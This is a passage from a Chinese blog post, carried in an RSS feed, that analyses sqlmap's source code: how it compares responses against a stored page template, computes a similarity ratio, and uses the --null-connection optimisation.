src=&quot;https://pic1.zhimg.com/v2-31010288239691eb6dbbbbeaa5f4d255_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1620&quot; data-rawheight=&quot;424&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31010288239691eb6dbbbbeaa5f4d255&quot; data-watermark-src=&quot;v2-f06c7f596d8bd6637e5dc5d992635f19&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在标注中，我们发现了我们之前的疑问，为什么 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 时而返回页面内容，时而返回页面与模版页面的比较结果。其实在于如果 &lt;code class=&quot;inline&quot;&gt;content/response&lt;/code&gt; 被设置为 &lt;code class=&quot;inline&quot;&gt;True&lt;/code&gt; 的时候，则会返回页面具体内容，headers，以及响应码；如果 &lt;code class=&quot;inline&quot;&gt;timeBasedCompare&lt;/code&gt; 被设定的时候，返回是否发生了延迟；默认情况返回与模版页面的比较结果。&lt;/p&gt;&lt;p&gt;我们发现这一个 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 函数很奇怪，他没有输入两个页面的内容，而是仅仅输入当前页面的相关信息，但是为什么笔者要明确说是与“模版页面”的比较结果呢？我们马上就跟入 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 一探究竟。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e87a24d60d2cbb3614eecfd760d55c6b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1077&quot; data-rawheight=&quot;449&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e87a24d60d2cbb3614eecfd760d55c6b&quot; data-watermark-src=&quot;v2-3a5937b488503b66381fb28faea64e7b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;进去之后根据图中的调用关系，我们主要需要观察一下 &lt;code class=&quot;inline&quot;&gt;_comparison&lt;/code&gt; 这个函数的行为。当打开这个函数的时候，我们发现也是一段接近一百行的函数，仍然是一个需要硬着头皮看下去的一段代码。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6bbd0c8d31d584f2b44c3d56b1ddc513_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1112&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6bbd0c8d31d584f2b44c3d56b1ddc513&quot; data-watermark-src=&quot;v2-ae634362bd18d5ac79886e5721995c28&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据图中的使用红色方框框住的代码，我们很容易就能发现，这其实是在禁用 &lt;code class=&quot;inline&quot;&gt;PageRatio&lt;/code&gt; 的页面相似度算法，而是因为用户设定了 &lt;code class=&quot;inline&quot;&gt;--string/--not-string/--regex/--code&lt;/code&gt; 从而可以明确从其他方面区分出页面为什么不同。当然，我们的重点并不是他，而是计算 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 并且使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 得出页面相似的具体逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9d3093ad48167b9ec3f755d23f26b274_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;822&quot; data-rawheight=&quot;487&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d3093ad48167b9ec3f755d23f26b274&quot; data-watermark-src=&quot;v2-27af2f2d71d73d24571e676a27ea0074&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;我相信令大家困惑的可能是这两段关于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 的代码，在前面的部分中，我们没有详细说明 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 究竟意味着什么：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;
  Optimization:
    These options can be used to optimize the performance of sqlmap
​
    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)&lt;/code&gt;&lt;p&gt;根据官方手册的描述，&lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 是一种不用获取页面内容就可以知道页面大小的方法，这种方法在布尔盲注中有非常好的效果，可以很好的节省带宽。具体的原理详见&lt;a href=&quot;http://www.wisec.it/sectou.php?id=472f952d79293&quot;&gt;这一片古老的文章&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;明白这一点，上面的代码就变得异常好懂了，如果没有启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt; 优化，两次比较的页面分别为 &lt;code class=&quot;inline&quot;&gt;page&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt;。其实 &lt;code class=&quot;inline&quot;&gt;kb.pageTemplate&lt;/code&gt; 也并不陌生，其实就是第一次正式访问页面的时候，存下的那个页面的内容。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
conf.originalPage = kb.pageTemplate = page&lt;/code&gt;&lt;p&gt;如果启用 &lt;code class=&quot;inline&quot;&gt;--null-connection&lt;/code&gt;，计算 ratio 就只是很简单的通过页面的长度来计算，计算公式为 &lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
ratio = 1. * pageLength / len(kv.pageTemplate)
​
if ratio &amp;gt; 1.:
    ratio = 1. / ratio&lt;/code&gt;&lt;p&gt;接下来我们再顺着他的逻辑往下走：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fe348699c782f91fd21c2a65027dccb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1332&quot; data-rawheight=&quot;650&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fe348699c782f91fd21c2a65027dccb9&quot; data-watermark-src=&quot;v2-c5ec57535b9e20fd12d85af9c4971566&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;根据上面对源码的标注，我们很容易理解这个 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 是怎么算出来的，同样我们也很清楚，其实并不只是简单无脑的使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 就可以起到很好的效果，配合各种各样的选项或者预处理：比如移除页面的动态内容，只比较 &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt;，只比较文本，不比较 &lt;code class=&quot;inline&quot;&gt;html&lt;/code&gt; 标签。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8cb294971e4a5551406807509e464c70_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1182&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8cb294971e4a5551406807509e464c70&quot; data-watermark-src=&quot;v2-8f38bc19f35863fd650048845660cbf7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上面源码为最终使用 &lt;code class=&quot;inline&quot;&gt;ratio&lt;/code&gt; 对页面的相似度作出判断的逻辑，其中&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;
UPPER_RATIO_BOUND = 0.98
LOWER_RATIO_BOUND = 0.02
DIFF_TOLERANCE = 0.05&lt;/code&gt;&lt;h2&gt;&lt;b&gt;0x05 结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;阅读完本文，我相信读者对 sqlmap 中处理各种问题的细节都会有自己的理解，当然这是最好的。&lt;/p&gt;&lt;p&gt;在下一篇文章，笔者将会带大家进入更深层的 sqlmap 的逻辑，敬请期待。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-09-10-44157153</guid>
<pubDate>Mon, 10 Sep 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
